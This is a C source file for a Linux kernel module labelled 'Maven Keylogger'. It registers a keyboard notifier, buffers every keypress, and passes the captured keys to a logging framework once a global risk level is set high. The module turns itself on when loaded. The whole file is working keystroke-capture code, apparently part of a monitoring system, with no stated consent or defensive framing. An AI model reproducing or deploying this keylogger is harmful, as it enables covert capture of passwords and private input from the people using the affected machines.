#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/mutex.h>

#include "../../include/common.h"
#include "../../include/mod_log.h"
#include "../../include/mod_allocator.h"
#include "../../include/mod_config.h"

/*
 * simple keylogging framework
 * Tries to abstract away as much of the notifier stuff as possible by
 * letting the user give us a callback to run
 */



DEFINE_MUTEX( mut );
static int kl_running = 0;
static int (*kbd_cb)(struct keyboard_notifier_param *param) = NULL;


/*
 * Keylogger stub. Checks the code, then calls the user supplied callback
 * The method signature is required by the notifier_block
 */
static int keylog_stub( struct notifier_block* nb, unsigned long code, void *_param) {
	struct keyboard_notifier_param * param;
	if( code != KBD_KEYCODE ) {
		return NOTIFY_OK;
	}
	BUG_ON( kbd_cb == NULL );
	param = _param;
	return kbd_cb( _param );
}

static struct notifier_block keylogger_nb = {
	.notifier_call = keylog_stub,
};

/*
 * Start a keylogger running the user supplied callback
 * Only one keylogger can be runinng at a time, so this method fails if one is started
 */
void start_keylogger( int (*cb)(struct keyboard_notifier_param *) ) {
	mutex_lock( &mut );
	if( kl_running ) {
		printk( KERN_WARNING "Maven: start_keylogger called when already running. Call stop first\n" );
	} else {
		kl_running = 1;
		kbd_cb = cb;
		register_keyboard_notifier( &keylogger_nb );
	}
	mutex_unlock( &mut );
}

/*
 * Stops the active keylogger (if one exists)
 *
 */
void stop_keylogger( void ) {
	mutex_lock( &mut );
	if( !kl_running ) {
		printk( KERN_WARNING "Maven: stop_keylogger called when not running\n" );
	} else {
		unregister_keyboard_notifier( &keylogger_nb );
		kbd_cb = NULL;
		kl_running = 0;
	}
	mutex_unlock( &mut );
}


#define KEYBUF_LEN 256
struct keybuf {
	size_t buflen;
	char values[KEYBUF_LEN];
} __attribute__((packed));

typedef struct keybuf keybuf_t;

keybuf_t kb = {0};

static int log_keys( void ) {
//	struct partial_msg* msg = msg_init_config_wrapper( "mod_kl", SEVERITY_DEBUG, 1 );
	struct partial_msg* msg = msg_init( "mod_kl", SEVERITY_DEBUG, 1 );
	//buflen comes before values in the struct, looks like a TYPE_BYTES to me
	msg_additem( msg, "keys", (void*)&kb, TYPE_BYTES );
	msg_finalize( msg );
	kb.buflen = 0;
	memset( kb.values, 0, KEYBUF_LEN );
	return 0;
}

static int do_key( unsigned int key ) {
	int risk_cutoff = (maven_global_risk < 5 ) ? KEYBUF_LEN : 1;
	BUG_ON( kb.buflen >= KEYBUF_LEN );
	if( key > (unsigned char)~0 ) {
		printk( "mod_kl: keypress %d cannot be cast to char without losing information\n", key );
		//but we're going to do it anyway
	}

	kb.values[(kb.buflen++)] = (char)(key);
	if( kb.buflen >= risk_cutoff ) {
		log_keys();
		BUG_ON( kb.buflen != 0 );
	}
	return 0;
}

static int log_keypress( struct keyboard_notifier_param * param ) {
	if( maven_global_risk <= 1 ) {
		return param->value; //do nothing unles risk is 2 or more
	} else {
		do_key( param->value );
	}
	return param->value;
}

static int kl_enabled = 0;
//todo just shove this in config?
static int set_kl_enabled( int enabled ) {
	if( enabled ) {
		if( !kl_enabled ) {
			start_keylogger( &log_keypress );
			kl_enabled = 1;
		}
	} else {
		if( kl_enabled ) {
			stop_keylogger();
			kl_enabled = 0;
		}
	}
	return kl_enabled;
}
static int get_kl_enabled( void ) {
	return kl_enabled;
}

struct transducer_descr transducer_kl = {
	.name = "Maven Keylogger",
	.get_enabled = get_kl_enabled,
	.set_enabled = set_kl_enabled,
};
EXPORT_SYMBOL( transducer_kl );


static int __init interceptor_start(void) {
	printk( KERN_INFO "mod_kl: loading\n" );
	set_kl_enabled( 1 );
	printk( KERN_INFO "mod_kl: loaded\n" );
	msg_moduleload("mod_kl");
	return 0;
}


static void __exit interceptor_end(void) {
	int i;
	struct hlist_node *tmp;
	struct keybuf* obj;
	msg_moduleload("mod_unload");
	printk( KERN_INFO "mod_kl: unloading\n" );
	set_kl_enabled( 0 );
	maven_allocator_info();
	printk( KERN_INFO "mod_kl: unloaded\n" );
}

EXPORT_SYMBOL(start_keylogger);
EXPORT_SYMBOL(stop_keylogger);
MODULE_LICENSE("GPL");
module_init(interceptor_start);
module_exit(interceptor_end);
